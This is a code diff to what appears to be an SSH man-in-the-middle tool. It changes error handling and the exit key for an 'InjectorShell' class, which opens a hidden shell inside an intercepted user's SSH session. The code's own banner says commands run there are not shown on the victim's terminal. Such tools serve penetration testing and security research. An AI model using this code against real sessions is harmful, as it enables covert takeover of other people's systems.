@@ -77,19 +77,19 @@ class SSHInjectableForwarder(SSHForwarder):
                         t.add_server_key(paramiko.RSAKey.generate(bits=self.HOST_KEY_LENGTH))
 
                     inject_server = InjectServer(self.server_channel)
-                    # TODO: Fix bug - socket breaks if original auth (with signature accept) fails
-                    event = threading.Event()
-                    t.start_server(event=event, server=inject_server)
+                    try:
+                        t.start_server(server=inject_server)
+                    except (ConnectionResetError, EOFError, paramiko.SSHException):
+                        t.close()
+                        continue
                     injector_channel = None
                     while not injector_channel:
-                        injector_channel = t.accept(1)
-                    event.wait()
-
+                        injector_channel = t.accept(0.5)
                     injector_shell = InjectorShell(addr, injector_channel, self)
                     injector_shell.start()
                     self.injector_shells.append(injector_shell)
                 time.sleep(0.1)
-        except paramiko.SSHException as e:
+        except (paramiko.SSHException, OSError) as e:
             logging.warning("injector connection suffered an unexpected error")
             logging.exception(e)
             self.close_session(self.channel)
@@ -132,7 +132,8 @@ class InjectorShell(threading.Thread):
     STEALTH_WARNING = """
     [NOTE]\r\n
     This is a hidden shell injected into the secure session the originally host created.\r\n
-    Any commands issued CAN affect the environment of the user BUT will not be displayed on their terminal!
+    Any commands issued CAN affect the environment of the user BUT will not be displayed on their terminal!\r\n
+    Exit the hidden shell with CTRL+C
     """
 
     def __init__(self, remote, client_channel, forwarder):
@@ -148,7 +149,7 @@ class InjectorShell(threading.Thread):
             while self.forwarder.inject_running:
                 if self.client_channel.recv_ready():
                     data = self.client_channel.recv(self.forwarder.BUF_LEN)
-                    if data.rstrip() == b'exit' or data == b'': # TODO: individual exit
+                    if data == b'\x03' or data == b'':
                         break
                     self.queue.put((data, self.client_channel))
                 time.sleep(0.1)
